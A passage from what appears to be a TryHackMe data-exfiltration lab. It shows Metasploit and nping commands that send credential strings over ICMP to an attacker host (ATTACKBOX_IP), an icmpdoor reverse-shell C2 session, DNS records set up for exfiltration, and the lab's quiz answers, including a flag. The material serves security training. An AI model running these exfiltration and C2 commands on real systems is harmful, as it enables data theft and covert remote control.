style="font-weight:400;font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background-color:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">icmp_exfil</span><span style="font-weight:400;font-size:1rem">&nbsp;</span>module to make it ready to capture and listen for ICMP traffic.&nbsp;<span style="font-weight:400;font-size:1rem">One of the requirements for this module is to set the&nbsp;</span><span class="notion-enable-hover" style="font-weight:400;font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background-color:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">BPF_FILTER</span><span style="font-weight:400;font-size:1rem">&nbsp;</span><span style="font-weight:400;font-size:1rem">option</span><span style="font-weight:400;font-size:1rem">, which is based on TCPDUMP rules,&nbsp;</span><span style="font-weight:400;font-size:1rem">to capture only ICMP packets and ignore any ICMP packets that have the source IP of the attacking machine as follows,</span></p>
    
    <p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Set the BPF_FILTER in MSF&nbsp;<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
                <code class=" language-markup">msf5 &gt; use auxiliary/server/icmp_exfil
msf5 auxiliary(server/icmp_exfil) &gt; set BPF_FILTER icmp and not src ATTACKBOX_IP
BPF_FILTER =&gt; icmp and not src ATTACKBOX_IP</code>
            </pre></div></div><p></p>
    
    
    <p style="box-sizing:border-box;margin-top:0px;margin-bottom:1rem;color:rgb(33, 37, 41);font-family:Ubuntu, monospace;font-size:16px;font-style:normal;font-variant-ligatures:normal;font-variant-caps:normal;font-weight:400;letter-spacing:normal;orphans:2;text-align:left;text-indent:0px;text-transform:none;white-space:normal;widows:2;word-spacing:0px;-webkit-text-stroke-width:0px;background-color:rgb(255, 255, 255);text-decoration-thickness:initial;text-decoration-style:initial;text-decoration-color:initial">We also need to select which network interface to listen to,&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">eth0</span>. Finally, executes&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">run</span><span style="font-size:1rem">&nbsp;</span>to start the module.</p>
    <p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Set the interface in MSF<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
                <code class=" language-markup">msf5 auxiliary(server/icmp_exfil) &gt; set INTERFACE eth0
INTERFACE =&gt; eth0
msf5 auxiliary(server/icmp_exfil) &gt; run
    
[*] ICMP Listener started on eth0 (ATTACKBOX_IP). Monitoring for trigger packet containing ^BOF
[*] Filename expected in initial packet, directly following trigger (e.g. ^BOFfilename.ext)</code>
            </pre></div></div><p></p>
    <p>We prepared&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">icmp.thm.com</span><span style="font-size:1rem">&nbsp;</span>as a victim machine to complete the ICMP task with the required tools. From the JumpBox, log in to the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">icmp.thm.com</span><span style="font-size:1rem">&nbsp;</span>using&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">thm:tryhackme</span><span style="font-size:1rem">&nbsp;</span>credentials.</p>
    
    <p> We have preinstalled the&nbsp;<a target="_blank" href="https://nmap.org/nping/" class="editor-rtfLink">nping</a> tool, an open-source tool for network packet generation, response analysis, and response time measurement. The NPING tool is part of the NMAP suite tools.</p><p><span>First, we will send the <a class="5n0yioDx glossary-term" onclick="initPopOver(&#39;BOF&#39;, &#39;5n0yioDx&#39;)">BOF</a> trigger from the ICMP machine so that the Metasploit framework starts writing to the disk.&nbsp;</span></p>
    <p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Sending the Trigger Value from the Victim<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
                <code class=" language-markup">thm@jump-box$ ssh thm@icmp.thm.com
thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "BOFfile.txt"
    
Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2022-04-25 23:23 EEST
SENT (0.0369s) ICMP [192.168.0.121 &gt; ATTACKBOX_IP Echo request (type=8/code=0) id=7785 seq=1] IP [ttl=64 id=40595 iplen=39 ]
RCVD (0.0376s) ICMP [ATTACKBOX_IP &gt; 192.168.0.121 Echo reply (type=0/code=0) id=7785 seq=1] IP [ttl=63 id=12656 iplen=39 ]
RCVD (0.0755s) ICMP [ATTACKBOX_IP &gt; 192.168.0.121 Echo reply (type=0/code=0) id=7785 seq=1] IP [ttl=31 id=60759 iplen=32 ]
    
Max rtt: 38.577ms | Min rtt: 0.636ms | Avg rtt: 19.606ms
Raw packets sent: 1 (39B) | Rcvd: 2 (71B) | Lost: 0 (0.00%)
Nping done: 1 IP address pinged in 1.06 seconds</code> </pre></div></div><p></p>
    <p><span style="font-size:1rem">We sent one ICMP packet using the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">nping</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">command with&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">--data-string</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">argument. We specify the trigger value with the file name&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">BOFfile.txt</span>, set by default in the Metasploit framework<span style="font-size:1rem">. This could be changed from Metasploit if needed!</span></p><p>Now check the AttackBox terminal. If everything is set correctly, the Metasploit framework should identify the trigger value and wait for the data to be written to disk.&nbsp;</p><p>Let's start sending the required data and the end of the file trigger value from the ICMP machine.</p>
    
    <p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Sending the Data and the End of the File Trigger Value<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
                <code class=" language-markup">thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin:password"
    
Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2022-04-25 23:23 EEST
SENT (0.0312s) ICMP [192.168.0.121 &gt; ATTACKBOX_IP Echo request (type=8/code=0) id=14633 seq=1] IP [ttl=64 id=13497 iplen=42 ]
RCVD (0.0328s) ICMP [ATTACKBOX_IP &gt; 192.168.0.121 Echo reply (type=0/code=0) id=14633 seq=1] IP [ttl=63 id=17031 iplen=42 ]
RCVD (0.0703s) ICMP [ATTACKBOX_IP &gt; 192.168.0.121 Echo reply (type=0/code=0) id=14633 seq=1] IP [ttl=31 id=41138 iplen=30 ]
    
Max rtt: 39.127ms | Min rtt: 1.589ms | Avg rtt: 20.358ms
Raw packets sent: 1 (42B) | Rcvd: 2 (72B) | Lost: 0 (0.00%)
Nping done: 1 IP address pinged in 1.06 seconds 
    
thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin2:password2"
    
Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2022-04-25 23:24 EEST
SENT (0.0354s) ICMP [192.168.0.121 &gt; ATTACKBOX_IP Echo request (type=8/code=0) id=39051 seq=1] IP [ttl=64 id=32661 iplen=44 ]
RCVD (0.0358s) ICMP [ATTACKBOX_IP &gt; 192.168.0.121 Echo reply (type=0/code=0) id=39051 seq=1] IP [ttl=63 id=18581 iplen=44 ]
RCVD (0.0748s) ICMP [ATTACKBOX_IP &gt; 192.168.0.121 Echo reply (type=0/code=0) id=39051 seq=1] IP [ttl=31 id=2149 iplen=30 ]
    
Max rtt: 39.312ms | Min rtt: 0.371ms | Avg rtt: 19.841ms
Raw packets sent: 1 (44B) | Rcvd: 2 (74B) | Lost: 0 (0.00%)
Nping done: 1 IP address pinged in 1.07 seconds 
    
thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "EOF"
    
Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2022-04-25 23:24 EEST
SENT (0.0364s) ICMP [192.168.0.121 &gt; ATTACKBOX_IP Echo request (type=8/code=0) id=33619 seq=1] IP [ttl=64 id=51488 iplen=31 ]
RCVD (0.0369s) ICMP [ATTACKBOX_IP &gt; 192.168.0.121 Echo reply (type=0/code=0) id=33619 seq=1] IP [ttl=63 id=19671 iplen=31 ]
RCVD (0.3760s) ICMP [ATTACKBOX_IP &gt; 192.168.0.121 Echo reply (type=0/code=0) id=33619 seq=1] IP [ttl=31 id=1003 iplen=36 ]
    
Max rtt: 339.555ms | Min rtt: 0.391ms | Avg rtt: 169.973ms
Raw packets sent: 1 (31B) | Rcvd: 2 (67B) | Lost: 0 (0.00%)
Nping done: 1 IP address pinged in 1.07 seconds
thm@icmp-host:~#</code> </pre></div></div><p></p>
    
    <p><span style="font-size:16px">Let's check our AttackBox once we have done sending the data and the ending trigger value.</span></p>
    
    <p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Receiving Data in MSF<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
                <code class=" language-markup">msf5 auxiliary(server/icmp_exfil) &gt; run
    
[*] ICMP Listener started on eth0 (ATTACKBOX_IP). Monitoring for trigger packet containing ^BOF
[*] Filename expected in initial packet, directly following trigger (e.g. ^BOFfilename.ext)
[+] Beginning capture of "file.txt" data
[*] 30 bytes of data received in total
[+] End of File received. Saving "file.txt" to loot
[+] Incoming file "file.txt" saved to loot
[+] Loot filename: /root/.msf4/loot/20220425212408_default_ATTACKBOX_IP_icmp_exfil_838825.txt</code> </pre></div></div><p></p>
    
    <p></p><p style="box-sizing:border-box;margin-top:0px;margin-bottom:1rem;color:rgb(33, 37, 41);font-family:Ubuntu, monospace;font-size:16px;font-style:normal;font-variant-ligatures:normal;font-variant-caps:normal;font-weight:400;letter-spacing:normal;orphans:2;text-align:left;text-indent:0px;text-transform:none;white-space:normal;widows:2;word-spacing:0px;-webkit-text-stroke-width:0px;background-color:rgb(255, 255, 255);text-decoration-thickness:initial;text-decoration-style:initial;text-decoration-color:initial"></p><div class="terminal-container" style="box-sizing:border-box;color:rgb(33, 37, 41);font-family:Ubuntu, monospace;font-size:16px;font-style:normal;font-variant-ligatures:normal;font-variant-caps:normal;font-weight:400;letter-spacing:normal;orphans:2;text-align:left;text-indent:0px;text-transform:none;white-space:normal;widows:2;word-spacing:0px;-webkit-text-stroke-width:0px;background-color:rgb(255, 255, 255);text-decoration-thickness:initial;text-decoration-style:initial;text-decoration-color:initial"><div class="terminal-content" style="box-sizing:border-box"></div></div><p></p><p style="box-sizing:border-box;margin-top:0px;margin-bottom:1rem;color:rgb(33, 37, 41);font-family:Ubuntu, monospace;font-size:16px;font-style:normal;font-variant-ligatures:normal;font-variant-caps:normal;font-weight:400;letter-spacing:normal;orphans:2;text-align:left;text-indent:0px;text-transform:none;white-space:normal;widows:2;word-spacing:0px;-webkit-text-stroke-width:0px;background-color:rgb(255, 255, 255);text-decoration-thickness:initial;text-decoration-style:initial;text-decoration-color:initial"><span style="box-sizing:border-box;font-size:16px">Nice! We have successfully transferred data over the ICMP protocol using the Metasploit Framework. You can check the loot file mentioned in the terminal to confirm the received data.</span></p><p><span style="font-size:24px"><span>ICMP <a class="4C3Jid3D glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;4C3Jid3D&#39;)">C2</a> Communication</span></span></p>
    
    <p>Next, we will show executing commands over the ICMP protocol using the <a href="https://github.com/krabelize/icmpdoor" target="_blank">ICMPDoor </a>tool. ICMPDoor is an open-source&nbsp;reverse-shell written in Python3 and scapy.&nbsp;<span style="font-size:1rem">The tool uses the same concept we discussed earlier in this task, where an attacker utilizes the Data section within the ICMP packet. The only difference is that an attacker sends a command that needs to be executed on a victim's machine. Once the command is executed, a victim machine sends the execution output within the ICMP packet in the Data section.</span></p><p style="text-align:center"><img src="./TryHackMe _ Data Exfiltration_files/c4c0b7beeaa41fd5b4a4f4cbe1ded82e.png" alt="C2 Communication over ICMP"><br></p><p> </p>
    <p><span>We have prepared the tools needed for <a class="RziV3AQX glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;RziV3AQX&#39;)">C2</a> communication over the ICMP protocol on </span><b>JumpBox </b>and the <b>ICMP-Host</b> machines. First, we need to log in to the ICMP machine,<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">icmp.thm.com</span>, and execute the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">icmpdoor</span>&nbsp;binary as follows,</p><p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Run the icmpdoor command on the ICMP-Host Machine<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
                <code class=" language-markup">thm@icmp-host:~$ sudo icmpdoor -i eth0 -d 192.168.0.133</code>
            </pre></div></div><p></p><p>Note that we specify the interface to communicate over and the destination IP of the server-side.</p><p>Next, log in to the JumpBox and execute the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">icmp-cnc</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">binary to communicate with the victim,&nbsp;</span>our ICMP-Host<span style="font-size:1rem">.&nbsp;</span><span style="font-size:1rem">Once the execution runs correctly, a communication channel is established over the ICMP protocol. Now we are ready to send the command that needs to be executed on the victim machine.&nbsp;</span></p>
    <p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">The data that needs to be transferred<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
                <code class=" language-markup">thm@jump-box$  sudo icmp-cnc -i eth1 -d 192.168.0.121
shell: hostname
hostname
shell: icmp-host</code>
            </pre></div></div><p></p>
    <p>Similar to the client-side binary, ensure to select the interface for the communication as well as the destination IP.&nbsp;As the previous terminal shows, we requested to execute the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">hostname</span><span style="font-size:1rem">&nbsp;</span>command, and we received&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">icmp-host</span>.</p><p>To confirm that all communications go through the ICMP protocol, we capture the network traffic during the communication using tcpdump as the following:</p><p style="text-align:center"><img src="./TryHackMe _ Data Exfiltration_files/b7df6f586e47769bf2addbee68d69cdc.png" alt="Capture ICMP traffic using tcpdump"></p><p> </p>
    </div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>In which ICMP packet section can we include our data?</p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ****" value="Data" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="7">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p><span>Follow the technique discussed in this task to establish a <a class="EPFOFENP glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;EPFOFENP&#39;)">C2</a> ICMP connection between JumpBox and ICMP-Host. Then execute the "getFlag" command. What is the flag?</span></p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{***************}" value="THM{g0t-1cmp-p4k3t!}" disabled="">
                            <input type="hidden" value="2">
                            <input type="hidden" value="7">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        <div class="room-task-input-hint">
                            <button type="button" class="btn btn-dorange faded btn-noline task-hint" onclick="getHint(this)">
                        <i class="fal fa-lightbulb"></i> Hint
                      </button>
                        </div>
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-8">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse8">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 8                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> DNS Configurations
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse8" class="collapse " data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p style="text-align:left"><span style="font-size:24px"><span><a class="TXktHXtW glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;TXktHXtW&#39;)">DNS</a> Configuration</span></span></p><p style="text-align:left"><span>To perform exfiltration via the <a class="4BhZxXSO glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;4BhZxXSO&#39;)">DNS</a> protocol, you need to control a domain name and set up DNS records, including NS, A, or TXT. Thus, we provide a web interface to make it easy for you to add and modify the DNS records. The following domain name is set up and ready for the DNS exfiltration task:&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">tunnel.com</span><span style="font-size:1rem">.</span></p><p style="text-align:left">To access the website, you may visit the following link:&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">http://MACHINE_IP/</span><span style="font-size:1rem">&nbsp;or&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">https://LAB_WEB_URL.p.thmlabs.com/</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">without the need for a VPN.</span></p><p style="text-align:center"><img src="./TryHackMe _ Data Exfiltration_files/b8b4c25e0eb4dd04f1aea8596bf9319e.png" alt="THM DNS Changer - The Main web interface"></p><p style="text-align:left"><span>Once you choose&nbsp;the domain name, you can add <a class="Q3IH2X0W glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;Q3IH2X0W&#39;)">DNS</a> records and test and reset the DNS configuration if something goes wrong</span><span style="font-size:16px">.</span></p><p style="text-align:center"><img src="./TryHackMe _ Data Exfiltration_files/af468d0202712ac1890f5dacb135e532.png" alt="DNS Management for tunnel.com" style="width:100%"><span style="font-size:16px"><br></span></p><p><span style="font-size:24px">New Attacker Machine</span></p><p>Note that we have added a new Attacker machine in Network 2, which has the following subdomain name and IP address:&nbsp;</p><table class="table table-bordered"><tbody><tr><td><b>Domain Name&nbsp;</b></td><td><b>IP Address</b></td><td><b>Network Access</b></td></tr><tr><td>attacker.thm.com<br></td><td>172.20.0.200</td><td>Network 2</td></tr></tbody></table><p><span style="font-size:1rem"><span>We will be using the Attacker machine to exfiltrate in <a class="mtV82Iza glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;mtV82Iza&#39;)">DNS</a> and DNS tunneling scenarios. The main goal is that the Attacker machine (on Network2) can access internal network devices of Network 1 through JumpBox.</span></span><br></p><p style="text-align:center"><img src="./TryHackMe _ Data Exfiltration_files/e6bf2c81281be5cf8515eeed22254643.png" alt="DNS Tunneling Goal!" style="width:765.9999923706055px;height:179.39776772991877px"><span style="font-size:1rem"><br></span></p><p><span style="font-size:24px"><span>Nameserver for <a class="eBxZC8Y1 glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;eBxZC8Y1&#39;)">DNS</a> Exfiltration</span></span></p><p><span>To successfully execute <a class="SghHc8hY glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;SghHc8hY&#39;)">DNS</a> exfiltration within the provided network or on the Internet, we need to set up a name server for the domain name we control as the following:</span></p><ol><li>Add an <b>A</b> record that points to the AttackBox's IP address.<span style="font-size:1rem">&nbsp;For example, Type: <b>A</b>, Subdomain Name: <b>t1ns</b>, Value: <b>AttackBox_IP</b>.</span></li><li><span style="font-size:1rem">Add an <b>NS</b><span> record that routes <a class="XHkXKKbO glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;XHkXKKbO&#39;)">DNS</a> queries to the </span><b>A</b> records in <b>step 1</b>. For example,&nbsp;</span>Type:&nbsp;<span style="font-weight:bolder">NS</span>, Subdomain Name:&nbsp;<span style="font-weight:bolder">t1</span>, Value:&nbsp;<span style="font-weight:bolder">t1ns.tunnel.com</span>.</li></ol><p>Ensure that for the NS value we specify the full domain name:&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">t1ns.tunnel.com</span>. Once the two records are added, the name server&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">t1.tunnel.com</span><span>&nbsp;is ready to be used for <a class="C80BAcNx glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;C80BAcNx&#39;)">DNS</a> Exfiltration purposes.</span></p><p>If you choose not to set up your AttackBox, we set up a nameserver for the Attacker machine within our provided network, and it is ready to use as follows,</p><table class="table table-bordered"><tbody><tr><td><b><span><a class="xPDIYfpv glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;xPDIYfpv&#39;)">DNS</a> Record</span></b></td><td><b>Type</b></td><td><b>Value</b></td></tr><tr><td>attNS.tunnel.com<br></td><td>A</td><td>172.20.0.200<br></td></tr><tr><td>att.tunnel.com</td><td>NS</td><td>attNS.tunnel.com<br></td></tr></tbody></table><p>Note that the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">attNS.thm.com</span>&nbsp;IP address points to the newly added attacker machine in our network and it&nbsp;<span style="font-size:1rem">is ready to be used in our environment between the&nbsp;</span><span style="font-size:1rem">JumpBox</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">and</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem"><span>Attacker for <a class="zj2ZuYky glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;zj2ZuYky&#39;)">DNS</a> tasks and purposes.</span></span></p>


<p style="text-align:left"><span style="font-size:24px">Lab Recommendation</span></p><p style="text-align:left">Even though you can use the AttackBox for this room, we recommend using the <b>JumpBox</b><span> for most parts (<a class="XfgNoKTA glossary-term" onclick="initPopOver(&#39;TCP&#39;, &#39;XfgNoKTA&#39;)">TCP</a>, SSH, ICMP, DNS) to avoid technical issues with DNS and networking. If you prefer to use the AttackBox for the DNS Tunneling task (task 10), you must change the DNS settings of the AttackBox to&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">MACHINE_IP</span><span style="font-size:1rem">.</span><span style="font-size:1rem"><span>&nbsp;There are many ways to change the <a class="ErJkWHWM glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;ErJkWHWM&#39;)">DNS</a> settings in the AttackBox machine. However, the following is one of the stable solutions we found for our environment.</span></span></p><p>First, we need to edit the Yaml Netplan configuration file.</p>

<p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Edit Netplan Configuration File<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">root@AttackBox:~# nano /etc/netplan/aws-vmimport-netplan.yaml</code>	    </pre></div></div><p></p>


<p><span style="font-size:1rem">Modify the Netplan configuration file and add the <b>nameserver</b> section under the <b>eth0</b> interface to be as the following:&nbsp;</span><br></p>
<pre class=" language-markup" tabindex="0"><code class=" language-markup"># Automatically generated by the vm import process
 network:
     ethernets:
         eth0:
             dhcp4: true
             optional: false
             nameservers:
                search: [tunnel.com]
                addresses: [MACHINE_IP]
         ens5:
             dhcp4: true
             optional: false
     version: 2</code></pre>
<p><span style="font-size:1rem">Finally, apply the Netplan Changes (This may need to be run twice).</span><br></p>


<p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Apply the Netplan Changes<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">root@AttackBox:~# netplan apply</code>	    </pre></div></div><p></p>

<p style="text-align:left"><span style="font-size:24px"><span><a class="KAEId5bS glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;KAEId5bS&#39;)">DNS</a> Testing</span></span></p><p style="text-align:left"><span>Once you have access to the Jump machine, you need to make sure that the <a class="BGJkeTYn glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;BGJkeTYn&#39;)">DNS</a> is working correctly by testing it as follows:</span></p>
<p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top"><span>Testing the <a class="pDqeiPX9 glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;pDqeiPX9&#39;)">DNS</a> configuration</span><br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">thm@jump-box:~$ dig +short test.thm.com
127.0.0.1
thm@jump-box:~$ ping test.thm.com -c 1
PING test.thm.com (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.018 ms

--- test.thm.com ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.018/0.018/0.018/0.000 ms</code>	    </pre></div></div><p></p>
